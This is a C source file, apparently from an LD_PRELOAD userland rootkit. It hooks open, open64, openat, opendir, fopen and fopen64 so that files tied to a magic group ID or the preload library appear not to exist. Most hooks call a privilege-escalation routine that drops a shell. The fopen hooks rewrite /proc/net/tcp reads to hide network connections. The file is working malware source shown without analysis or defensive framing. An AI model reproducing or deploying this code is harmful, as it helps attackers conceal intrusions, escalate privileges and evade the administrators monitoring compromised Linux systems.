#include "father.h"

/*
 * open() hook, check GID and preload location. Attempt LPE.
 */
int (*o_open)(const char *, int, mode_t);
int open(const char *pathname, int flags, mode_t mode) {

#ifdef DEBUG
  fprintf(stderr, "open() called!\n");
#endif

  lpe_drop_shell();

  if (!o_open)
    o_open = dlsym(RTLD_NEXT, "open");

  if (getegid() == GID)
    return o_open(pathname, flags, mode);

  struct stat s_buf;

  memset(&s_buf, 0, sizeof(struct stat));

  __lxstat(_STAT_VER, pathname, &s_buf);

  if (s_buf.st_gid == GID || strstr(pathname, PRELOAD)) {
    errno = ENOENT;
    return -1;
  }

  return o_open(pathname, flags, mode);
}

/*
 * open64() hook, check GID and preload location. Attempt LPE.
 */
int (*o_open64)(const char *, int, mode_t);
int open64(const char *pathname, int flags, mode_t mode) {

#ifdef DEBUG
  fprintf(stderr, "open64() called!\n");
#endif

  lpe_drop_shell();

  if (!o_open64)
    o_open64 = dlsym(RTLD_NEXT, "open64");

  if (getegid() == GID)
    return o_open64(pathname, flags, mode);

  struct stat64 s_buf;

  memset(&s_buf, 0, sizeof(struct stat64));

  __lxstat64(_STAT_VER, pathname, &s_buf);

  if (s_buf.st_gid == GID || strstr(pathname, PRELOAD)) {
    errno = ENOENT;
    return -1;
  }

  return o_open64(pathname, flags, mode);
}

/*
 * openat() hook. Called by grep and other programs
 */
int (*o_openat)(int, const char *, int);
int openat(int dirfd, const char *pathname, int flags) {

#ifdef DEBUG
  fprintf(stderr, "openat() called!\n");
#endif

  if (!o_openat)
    o_openat = dlsym(RTLD_NEXT, "openat");

  if (getegid() == GID)
    return o_openat(dirfd, pathname, flags);

  struct stat sbuf;

  fstatat(dirfd, pathname, &sbuf, flags);

  if (sbuf.st_gid == GID || strstr(pathname, PRELOAD)) {
    errno = ENOENT;
    return -1;
  }

  return o_openat(dirfd, pathname, flags);
}

DIR *(*o_opendir)(const char *);
DIR *opendir(const char *name) {

#ifdef DEBUG
  fprintf(stderr, "opendir() called!\n");
#endif

  if (!o_opendir)
    o_opendir = dlsym(RTLD_NEXT, "opendir");

  if (getegid() == GID)
    return o_opendir(name);

  struct stat buf;

  __lxstat(_STAT_VER, name, &buf);

  if (buf.st_gid == GID || strstr(name, STRING)) {
    errno = ENOENT;
    return NULL;
  }

  return o_opendir(name);
}

/*
 * fopen() hook. Check MAGIC GID, attempt LPE, and call falsify_tcp() to hide
 * network connections.
 */
FILE *(*o_fopen)(const char *, const char *);
FILE *fopen(const char *pathname, const char *mode) {

#ifdef DEBUG
  fprintf(stderr, "fopen() called!\n");
#endif

  lpe_drop_shell();

  if (!o_fopen)
    o_fopen = dlsym(RTLD_NEXT, "fopen");

  if (getegid() == GID)
    return o_fopen(pathname, mode);

  struct stat64 sbuf;

  __lxstat64(_STAT_VER, pathname, &sbuf);

  if (sbuf.st_gid == GID) {
    errno = ENOENT;
    return NULL;
  }

  if (!strncmp(pathname, "/proc/net/tcp", 13)) {
    return falsify_tcp(pathname, mode, o_fopen);
  }
  return o_fopen(pathname, mode);
}

/*
 * fopen64() hook. Check MAGIC GID, attempt LPE, and call falsify_tcp() to hide
 * network connections.
 */
FILE *(*o_fopen64)(const char *, const char *);
FILE *fopen64(const char *pathname, const char *mode) {

#ifdef DEBUG
  fprintf(stderr, "fopen64() called!\n");
#endif

  lpe_drop_shell();

  if (!o_fopen64)
    o_fopen64 = dlsym(RTLD_NEXT, "fopen64");

  if (getegid() == GID)
    return o_fopen64(pathname, mode);

  struct stat64 sbuf;

  __lxstat64(_STAT_VER, pathname, &sbuf);

  if (sbuf.st_gid == GID) {
    errno = ENOENT;
    return NULL;
  }

  if (!strncmp(pathname, "/proc/net/tcp", 13)) {
    return falsify_tcp(pathname, mode, o_fopen64);
  }
  return o_fopen64(pathname, mode);
}
